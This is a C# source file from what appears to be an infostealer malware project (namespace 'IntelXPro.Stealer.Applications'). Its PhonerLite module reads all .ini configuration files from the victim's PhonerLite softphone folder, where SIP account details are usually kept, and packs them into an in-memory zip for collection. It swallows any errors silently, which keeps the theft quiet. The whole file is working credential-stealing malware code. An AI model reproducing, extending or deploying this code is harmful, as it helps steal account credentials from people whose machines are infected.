using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class PhonerLite : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PhonerLite");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "PhonerLite";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                try
                {
                    string[] iniFiles = Directory.GetFiles(appDataPath, "*.ini", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in iniFiles)
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\PhonerLite\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
                catch
                {
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
